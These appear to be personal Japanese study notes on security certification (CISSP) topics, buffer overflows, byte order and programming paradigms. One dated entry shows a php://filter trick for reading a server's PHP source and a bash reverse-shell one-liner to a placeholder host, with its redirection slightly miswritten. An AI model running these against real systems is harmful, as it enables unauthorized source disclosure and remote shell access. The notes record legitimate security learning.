...
プッシュした際にスタックしてあるデータを上書きして消さないようにバッファを確保しておく。
このバッファ以上の入力を与えてスタック領域のデータを上書きすることがバッファオーバーフロー

バイトオーダー
リトルエンディアンとビッグエンディアン
リトルエンディアンはコンピュータにとってわかりやすい
0x01234567を格納する際、
|0x169|0x170|0x171|0x172|メモリアドレス
| 0x67| 0x45| 0x23| 0x01|データ
となる。
...
- CISSPの考え方はあくまでも一例
- データオーナー(説明責任を有する人)、データコントローラ（オーナーの代理）、データカストディアン（保管に責任を持つ人）、データスチュワード（データと実際を結ぶ人）、データプロセッサー（コントローラーに変わり実際に処理するエンティティ）、データサブジェクト（識別される個人）
### 2025.2.13
##### CISSP学習
- CISSPは人に着目する
- セキュリティモデルにはBLP(機密性)やBiba（完全性）,Brewe-Nash（利益相反）といったものがある
- アクセス制御はMAC,DAC,NDACの３種類✖️RBAC,RuBAC,ABACの３種類
- ブロック暗号はデータの長さが分かっているものに適している
- stream暗号はデータの長さが不明なものに適している
- ステガノグラフィーは平文に隠すこと。平文を変換ではない！
- 数学的問題を利用
    - 素因数分解
        - RSA
    - 離散対数問題
        ...
        - ElGamal
        - ECC(楕円曲線暗号)
- セキュリティエンジニアリングはNIST 800-160
- 人材育成はNIST 800-181 Rev1(NICEフレームワーク)
- ゼロトラストアーキテクチャはNIST 800-207
### 2025.2.14
- php filterテクニックを使えばソースコードを取得できる。具体的手順は以下
1. http://hoge?page=php://filter/convert.base64-encode/resource=hoge.phpをブラウザに入力
2. 表示されたbaae64をコピー
3. コピーしたテキストをデコード（cat hoge |base64 -d > fuga）
- ターゲット側にncがなくてもリバースシェルできることを知った！
bash -i >& /dev/tcp/hoge/fuga 0>1
&は通常バックグラウンド処理を指定するが、>&だと意味が変わって標準出力と標準エラー出力をリダイレクトする。
/dev/はデバイスとの通信を行うためのディレクトリ
### 2025.2.15
- セキュリティイベントに参加
SSVCという指標があることを知った。CVSSはもう古いｗ
CVSSやCVEはSCAPというプロトコルの一部らしい
脆弱性対応の最初の１歩はASMなりで資産の棚卸しということ
### 2025.2.16
##### 本田講師の講義に参加
手続型と関数型の本質的な違いと意味
業務上意識することは全くないが言ってる中身は大事
◯◯型というのは方針の選択肢を提供している。
つまり、こういう風にすれば可読性とか保守性を挙げられるよねってこと
手続型=>仕様を上から順に記述
関数型=>仕様を関数毎に分離して組み合わせて仕上げる（パズル的）
オブジェクト型=>仕様をオブジェクトの組み合わせで仕上げる（村づくり）
関数型で気を付けるのは次の２点
1. 関数の処理は関数の中で完結しておけ
2. 関数の中で完結させられない条件は引数で渡せ
全ての処理は外から見れば関数、中身を見れば手続型
